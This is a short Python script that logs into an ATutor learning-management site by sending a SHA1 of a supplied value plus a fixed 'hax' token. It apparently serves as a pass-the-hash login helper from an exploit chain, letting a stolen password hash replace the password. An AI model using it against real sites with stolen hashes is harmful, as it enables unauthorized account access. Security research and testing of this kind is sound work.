import sys
import requests
import hashlib

def generateHash(passwd, token):
	m = hashlib.sha1()
	m.update(passwd.encode('utf-8') + token.encode('utf-8'))
	return m.hexdigest()

def login():
	target = "http://%s/atutor/login.php" % sys.argv[1]
	token = "hax"
	hashed = generateHash(sys.argv[3], token)
	d = {
		"form_password_hidden" : hashed,
		"form_login": "%s" % sys.argv[2] ,
		"submit" : "Login",
		"token" : token
	}
	
	s = requests.Session()
	r = s.post(target, data=d)
	res = r.text
	if "Create Course: My Start Page" in res or "My Courses: My Start Page" in res:
		return True
	return False


def main():
	if login():
		print("[+] Login successful!")
	else:
		print("[!] Login Failed.")

if __name__ == "__main__":
	main()
